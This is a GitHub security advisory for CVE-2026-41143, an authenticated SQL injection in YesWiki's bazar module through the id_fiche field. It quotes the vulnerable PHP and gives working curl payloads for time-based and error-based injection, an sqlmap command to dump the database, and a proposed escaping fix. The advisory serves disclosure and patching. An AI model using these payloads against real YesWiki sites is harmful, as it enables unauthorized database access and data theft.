# [H] YesWiki vulnerable to authenticated SQL Injection via id_fiche in EntryManager::formatDataBeforeSave()

## Summary
Severity: High
Advisory: GHSA-f58v-p6j9-24c2
CVE: CVE-2026-41143
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-18
Source: https://github.com/advisories/GHSA-f58v-p6j9-24c2
Type: github-advisory

## Affected
- Packagist: `yeswiki/yeswiki` — affected >=0 <4.6.1

## Details
## Vulnerability Details

YesWiki bazar module contains a SQL injection vulnerability in `tools/bazar/services/EntryManager.php` at line 704. The `$data['id_fiche']` value (sourced from `$_POST['id_fiche']`) is concatenated directly into a raw SQL query without any sanitization or parameterization.

**Vulnerable Code (EntryManager.php:704):**
```php
$result = $this->dbService->loadSingle(
    'SELECT MIN(time) as firsttime FROM ' . $this->dbService->prefixTable('pages') .
    "WHERE tag='" . $data['id_fiche'] . "'"
);
```

**Attack Path:**
1. Attacker authenticates as any user (route requires `acl:{"+"}`)
2. POST `/api/entries/{formId}` with `id_fiche=' OR SLEEP(3) OR '`
3. `ApiController::createEntry()` checks `isEntry($_POST['id_fiche'])` → false (not existing entry) → calls `create()`
4. `create()` → `formatDataBeforeSave()` → SQL injection at line 704

**`dbService->loadSingle()` passes raw string to `mysqli_query()` with no escaping. The `escape()` method exists but is NOT called here.**

**Docker PoC confirmation:**
- Normal query: `SELECT MIN(time) as firsttime FROM wiki_pages WHERE tag='TestEntry'` → `2024-01-01 00:00:00`
- Injected: `WHERE tag='' OR SLEEP(3) OR ''` → **elapsed: 3.00s (SLEEP confirmed)**
- Time-based blind SQLi enables full database dump via binary search

## Steps to Reproduce

**Prerequisites:** Any authenticated user account on a YesWiki instance with a bazar form (id_typeannonce) created.

**Step 1 – Obtain session cookie** (standard login via web UI or API)

**Step 2 – Time-based blind SQLi (confirm vulnerability):**
```bash
curl -s -X POST 'http://TARGET/?api/entries/1' \
  -H 'Cookie: wikini_session=<SESSION>' \
  -d "antispam=1&bf_titre=TestTitle&id_fiche=' OR SLEEP(3) OR '"
```
→ Response delays ~3 seconds confirming SQL injection.

**Step 3 – Error-based SQLi (version exfil):**
```bash
curl -s -X POST 'http://TARGET/?api/entries/1' \
  -H 'Cookie: wikini_session=<SESSION>' \
  -d "antispam=1&bf_titre=TestTitle&id_fiche=' AND extractvalue(1,concat(0x7e,@@version))-- -"
```
→ Returns MySQL version in XPATH error: `XPATH syntax error: '~8.4.8'`

**Step 4 – Full dump via sqlmap:**
```bash
sqlmap -u 'http://TARGET/?api/entries/1' \
  --data "antispam=1&bf_titre=T&id_fiche=test" \
  -p id_fiche --cookie "wikini_session=<SESSION>" \
  --dbms=MySQL --technique=BET --level=2
```

## Docker PoC Output (confirmed)
```
[STEP 1] Normal input: Result (2024-01-01 00:00:00)
[STEP 2] id_fiche=' OR SLEEP(3) OR '  → Elapsed: 3.00s ← SLEEP(3) CONFIRMED
[STEP 3] id_fiche=' AND extractvalue(1,concat(0x7e,@@version))-- -
         DB_ERROR: (1105, "XPATH syntax error: '~8.4.8'")
```

## Root Cause

In `tools/bazar/services/EntryManager.php` line 704:
```php
$result = $this->dbService->loadSingle(
    'SELECT MIN(time) as firsttime FROM ' . $this->dbService->prefixTable('pages') .
    "WHERE tag='" . $data['id_fiche'] . "'"
);
```
`$data['id_fiche']` comes from `$_POST['id_fiche']` (user input). `DbService::escape()` exists but is **not called** here. `loadSingle()` passes the raw string directly to `mysqli_query()`.

## Proposed Fix

Replace the vulnerable line with parameterized query or call `$this->dbService->escape()`:
```php
$tag = $this->dbService->escape($data['id_fiche']);
$result = $this->dbService->loadSingle(
    'SELECT MIN(time) as firsttime FROM ' . $this->dbService->prefixTable('pages') .
    "WHERE tag='" . $tag . "'"
);
```

## PoC Screenshot

![PoC: SLEEP(3) confirmed + MySQL version exfil](https://raw.githubusercontent.com/n0z0/cve-evidence/main/2026-04/20260401_133905_2bc5340f9be9_yeswiki_sqli_sleep3_confirmed_20260401_133745.png)

## References
- https://github.com/YesWiki/yeswiki/security/advisories/GHSA-f58v-p6j9-24c2
- https://nvd.nist.gov/vuln/detail/CVE-2026-41143
- https://github.com/YesWiki/yeswiki
- https://github.com/YesWiki/yeswiki/releases/tag/v4.6.1
